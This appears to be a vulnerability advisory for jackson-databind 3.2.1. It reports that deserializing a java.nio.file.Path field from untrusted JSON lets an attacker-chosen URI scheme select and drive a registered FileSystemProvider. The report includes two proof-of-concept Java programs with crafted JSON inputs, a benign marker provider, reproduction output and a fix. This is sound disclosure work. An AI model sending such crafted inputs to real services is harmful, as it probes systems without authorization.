@@ -1,0 +1,216 @@
+Summary
+A java.nio.file.Path field bound from untrusted JSON reaches JDKFromStringDeserializer.NioPathHelper.deserialize. The attacker string flows through new URI(value) → Path.of(uri), then on FileSystemNotFoundException into a ServiceLoader<FileSystemProvider> enumeration that calls provider.getPath(uri) on the first scheme-matching provider. No scheme is rejected, so untrusted JSON can drive an arbitrary registered provider under the default JsonMapper.builder().build().
+
+Impact is bounded. The JDK built-in providers (file, jar/zipfs) do no network I/O and do not mount, so the path is inert without a side-effecting third-party provider. Binding Path from untrusted input is already an anti-pattern.
+
+Description
+NioPathHelper.deserialize performs provider resolution driven by the attacker URI (abridged; the real method also handles a Windows drive-letter prefix and wraps failures via ctxt.handleInstantiationProblem(...)):
+
+int colonIx = value.indexOf(':');
+if (colonIx < 0) { return Path.of(value); }
+...
+final URI uri = new URI(value);          // attacker-controlled URI string
+try {
+    return Path.of(uri);                  // resolves scheme -> may load a FileSystemProvider
+} catch (FileSystemNotFoundException cause) {
+    final String scheme = uri.getScheme();
+    for (FileSystemProvider provider : ServiceLoader.load(FileSystemProvider.class)) {
+        if (provider.getScheme().equalsIgnoreCase(scheme)) {
+            return provider.getPath(uri);  // attacker scheme selects & drives a provider
+        }
+    }
+    // no matching provider -> ctxt.handleInstantiationProblem(...) (throws by default)
+}
+The attacker's scheme selects the provider and the attacker's URI is passed to it; the enumeration also forces provider classloading during readValue. For built-in schemes like jar:, getPath throws FileSystemNotFoundException (a mount requires explicit newFileSystem), surfacing as a wrapped ValueInstantiationException with no terminal effect. Any mount, network I/O, or resource access depends entirely on the selected provider.
+
+Vulnerable Code Location
+src/main/java/tools/jackson/databind/deser/jdk/JDKFromStringDeserializer.java
+STD_PATH → NioPathHelper.deserialize; NioPathHelper.deserialize body
+(new URI → Path.of(uri) → ServiceLoader.load(FileSystemProvider.class) → provider.getPath(uri)).
+Proof of Concept
+Two PoCs are provided.
+
+PoC 2 registers a custom FileSystemProvider to show that attacker JSON reaches provider.getPath(attackerURI) inside readValue. Whether a third-party provider then does anything harmful is outside the library's control. The in-scope issue is PoC 1 — the jar:/arbitrary-scheme path reaching the ServiceLoader fallback with no scheme restriction.
+
+PoC 1 — sink reached (built-in jar provider).
+
+com/poc/Vuln04_PathProvider.java:
+
+package com.poc;
+
+import tools.jackson.databind.ObjectMapper;
+import tools.jackson.databind.json.JsonMapper;
+import java.nio.file.Path;
+
+/**
+ * Vuln 4: java.nio.file.Path deserialization resolves an attacker URI via
+ * Path.of(uri) / ServiceLoader<FileSystemProvider>.
+ */
+public class Vuln04_PathProvider {
+    public static class Config { public Path workdir; }
+
+    public static void main(String[] args) throws Exception {
+        ObjectMapper mapper = JsonMapper.builder().build();
+        // jar: scheme forces FileSystemProvider resolution / mounting attempt on attacker URI.
+        String json = "{\"workdir\":\"jar:file:/tmp/jackson_poc_evil.zip!/x\"}";
+        System.out.println("Deserializing (default mapper): " + json);
+        try {
+            Config c = mapper.readValue(json, Config.class);
+            System.out.println("Resolved Path = " + c.workdir + "  (class=" + (c.workdir==null?"null":c.workdir.getClass().getName()) + ")");
+            System.out.println("RESULT: VULNERABLE - attacker URI scheme resolved through provider machinery during readValue");
+        } catch (Throwable t) {
+            System.out.println("Throwable during resolution: " + t.getClass().getName() + ": " + t.getMessage());
+            System.out.println("RESULT: VULNERABLE (attacker URI drove provider resolution; threw " + t.getClass().getSimpleName() + " inside readValue)");
+        }
+    }
+}
+PoC 2 — scheme-selection mechanism demo (custom FileSystemProvider).
+A third-party provider (scheme evilscheme) registered via META-INF/services/java.nio.file.spi.FileSystemProvider, which is standing in for any provider a real application ships.
+
+com/poc/EvilFileSystemProvider.java:
+
+package com.poc;
+
+import java.nio.file.*;
+import java.nio.file.spi.FileSystemProvider;
+import java.nio.file.attribute.*;
+import java.net.URI;
+import java.io.IOException;
+import java.util.*;
+import java.util.Set;
+import java.nio.channels.SeekableByteChannel;
+
+/**
+ * A custom java.nio.file.spi.FileSystemProvider registered via META-INF/services, using the
+ * scheme "evilscheme". It stands in for ANY third-party FileSystemProvider present on a real
+ * application's classpath. Its static initializer and getPath() record that they executed,
+ * proving that attacker-controlled JSON drove provider class loading + provider.getPath(uri)
+ * inside jackson's readValue.
+ */
+public class EvilFileSystemProvider extends FileSystemProvider {
+    public static volatile boolean STATIC_INIT_RAN = false;
+    public static volatile String GET_PATH_URI = null;
+    static { STATIC_INIT_RAN = true; }
+
+    @Override public String getScheme() { return "evilscheme"; }
+
+    @Override public Path getPath(URI uri) {
+        GET_PATH_URI = uri.toString();
+        System.out.println(">>> [EVIL-PROVIDER] getPath() invoked with attacker URI: " + uri);
+        // A malicious/vulnerable provider could here open a socket, read a file, mount a FS, etc.
+        return java.nio.file.Path.of(System.getProperty("java.io.tmpdir"), "evilprovider-marker");
+    }
+
+    // --- remaining abstract methods: minimal stubs ---
+    @Override public FileSystem newFileSystem(URI uri, Map<String,?> env) { throw new UnsupportedOperationException(); }
+    @Override public FileSystem getFileSystem(URI uri) { throw new FileSystemNotFoundException(); }
+    @Override public SeekableByteChannel newByteChannel(Path p, Set<? extends OpenOption> o, FileAttribute<?>... a) throws IOException { throw new UnsupportedOperationException(); }
+    @Override public DirectoryStream<Path> newDirectoryStream(Path d, DirectoryStream.Filter<? super Path> f) { throw new UnsupportedOperationException(); }
+    @Override public void createDirectory(Path d, FileAttribute<?>... a) { throw new UnsupportedOperationException(); }
+    @Override public void delete(Path p) { throw new UnsupportedOperationException(); }
+    @Override public void copy(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }
+    @Override public void move(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }
+    @Override public boolean isSameFile(Path p, Path p2) { return false; }
+    @Override public boolean isHidden(Path p) { return false; }
+    @Override public FileStore getFileStore(Path p) { throw new UnsupportedOperationException(); }
+    @Override public void checkAccess(Path p, AccessMode... m) { }
+    @Override public <V extends FileAttributeView> V getFileAttributeView(Path p, Class<V> t, LinkOption... o) { return null; }
+    @Override public <A extends BasicFileAttributes> A readAttributes(Path p, Class<A> t, LinkOption... o) { throw new UnsupportedOperationException(); }
+    @Override public Map<String,Object> readAttributes(Path p, String a, LinkOption... o) { throw new UnsupportedOperationException(); }
+    @Override public void setAttribute(Path p, String a, Object v, LinkOption... o) { }
+}
+Registration descriptor —
+src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider:
+
+com.poc.EvilFileSystemProvider
+Driver — com/poc/Vuln04b_PathProviderMount.java:
+
+package com.poc;
+
+import tools.jackson.databind.ObjectMapper;
+import tools.jackson.databind.json.JsonMapper;
+
+/**
+ * Vuln 4 (end-to-end terminal effect): a third-party FileSystemProvider registered via
+ * META-INF/services (scheme "evilscheme") stands in for any provider on a real app's
+ * classpath. Attacker JSON with that scheme drives jackson's ServiceLoader fallback to
+ * (1) load the provider class (running its static initializer) and (2) invoke
+ * provider.getPath(attackerUri) -- all inside readValue, with NO application code.
+ */
+public class Vuln04b_PathProviderMount {
+    public static class Config { public java.nio.file.Path workdir; }
+
+    public static void main(String[] args) throws Exception {
+        System.out.println("Provider static-init ran before deserialization? " + EvilFileSystemProvider.STATIC_INIT_RAN);
+        ObjectMapper mapper = JsonMapper.builder().build();   // default config
+        String json = "{\"workdir\":\"evilscheme://attacker-controlled/target?x=1\"}";
+        System.out.println("Deserializing (default mapper): " + json);
+
+        Config c = mapper.readValue(json, Config.class);
+
+        System.out.println("Resolved Path = " + c.workdir);
+        System.out.println("Provider static-init ran: " + EvilFileSystemProvider.STATIC_INIT_RAN);
+        System.out.println("Provider.getPath() attacker URI: " + EvilFileSystemProvider.GET_PATH_URI);
+        boolean ok = EvilFileSystemProvider.GET_PATH_URI != null
+                && EvilFileSystemProvider.GET_PATH_URI.contains("attacker-controlled");
+        System.out.println(ok
+            ? "RESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)"
+            : "RESULT: NOT reproduced");
+    }
+}
+Execution Steps
+The PoCs need only the three Jackson 3.2.1 jars on the classpath and can be built with plain javac/java . PoC 2 additionally requires the META-INF/services descriptor to be on the runtime classpath
+
+# 0. Locate the three published dependency jars.
+M2="$HOME/.m2/repository"
+DB="$M2/tools/jackson/core/jackson-databind/3.2.1/jackson-databind-3.2.1.jar"
+CORE="$M2/tools/jackson/core/jackson-core/3.2.1/jackson-core-3.2.1.jar"
+ANN="$M2/com/fasterxml/jackson/core/jackson-annotations/2.22/jackson-annotations-2.22.jar"
+CP="$DB:$CORE:$ANN"
+
+# 1. Compile the three sources.
+cd poc-project
+mkdir -p out
+javac -cp "$CP" -d out \
+  src/main/java/com/poc/EvilFileSystemProvider.java \
+  src/main/java/com/poc/Vuln04_PathProvider.java \
+  src/main/java/com/poc/Vuln04b_PathProviderMount.java
+
+# 2. Put the ServiceLoader descriptor on the runtime classpath (needed by PoC 2).
+mkdir -p out/META-INF/services
+cp src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider \
+   out/META-INF/services/java.nio.file.spi.FileSystemProvider
+
+# 3. Run both PoCs.
+java -cp "out:$CP" com.poc.Vuln04_PathProvider        # PoC 1
+java -cp "out:$CP" com.poc.Vuln04b_PathProviderMount  # PoC 2
+Reproduction Evidence
+Executed against jackson-databind 3.2.1 (OpenJDK 25).
+
+PoC 1 :
+
+Deserializing (default mapper): {"workdir":"jar:file:/tmp/jackson_poc_evil.zip!/x"}
+Throwable during resolution: tools.jackson.databind.exc.ValueInstantiationException: Cannot construct instance of `java.nio.file.Path`, problem: `java.nio.file.FileSystemNotFoundException`
+ at [Source: REDACTED (`StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION` disabled); byte offset: #UNKNOWN] (through reference chain: com.poc.Vuln04_PathProvider$Config["workdir"])
+RESULT: VULNERABLE (attacker URI drove provider resolution; threw ValueInstantiationException inside readValue)
+Notes: the JDK built-in jar provider's getPath does not auto-mount (it also throws FileSystemNotFoundException, since only newFileSystem mounts). PoC 1 proves the in-scope defect: attacker input reaches the scheme-driven ServiceLoader resolution during readValue with no allow-list. PoC 2 only illustrates the downstream mechanism.
+
+PoC 2 :
+
+Provider static-init ran before deserialization? true
+Deserializing (default mapper): {"workdir":"evilscheme://attacker-controlled/target?x=1"}
+>>> [EVIL-PROVIDER] getPath() invoked with attacker URI: evilscheme://attacker-controlled/target?x=1
+Resolved Path = /var/folders/.../T/evilprovider-marker
+Provider static-init ran: true
+Provider.getPath() attacker URI: evilscheme://attacker-controlled/target?x=1
+RESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)
+Purely from a JSON string, jackson's ServiceLoader fallback selected the attacker-named scheme's provider and invoked provider.getPath(uri) with the full attacker URI inside readValue. Whether a given provider then does anything harmful is outside the library's control; the in-scope issue is the absence of a scheme restriction before this fallback runs.
+
+Impact
+Untrusted JSON drives provider.getPath(attackerURI) on an attacker-chosen provider during readValue. With only the JDK built-in providers this is inert. Real impact requires a side-effecting third-party provider on the classpath. The fix is to close the
+scheme-restriction gap.
+
+Recommended Fix
+Restrict the resolved scheme to a fixed, hard-coded set ; reject jar: and other schemes via ctxt.handleWeirdStringValue(...). A hard-coded set keeps the fix backport-safe with no new configuration surface.
+Skip the ServiceLoader<FileSystemProvider> enumeration for disallowed schemes, so untrusted JSON cannot select and drive an arbitrary registered provider.
+Document that java.nio.file.Path-typed fields should not be bound from untrusted JSON.
